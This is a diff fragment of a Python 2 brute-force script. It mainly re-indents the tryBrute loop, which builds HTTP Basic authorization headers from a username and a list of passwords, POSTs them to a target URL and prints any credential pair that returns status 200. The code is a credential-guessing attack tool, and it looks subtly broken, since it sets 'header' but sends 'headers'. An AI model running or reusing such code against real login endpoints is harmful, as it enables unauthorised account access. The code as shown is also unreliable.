@@ -14,12 +14,12 @@ def tryBrute():
         userAndPass = username + ":" + pwd
         userAndPassEncode = b64encode(userAndPass).decode("ascii")
         authString = str('Basic %s' %  userAndPassEncode)
-header = {
+        header = {
            'authorization': authString,
            'cache-control': "no-cache",
         }
-response = requests.request("POST", url, headers=headers)
-    if response.status_code == 200:
-        print username + ":" + pwd
+        response = requests.request("POST", url, headers=headers)
+        if response.status_code == 200:
+            print username + ":" + pwd
 createPassList(worddict)
 tryBrute()
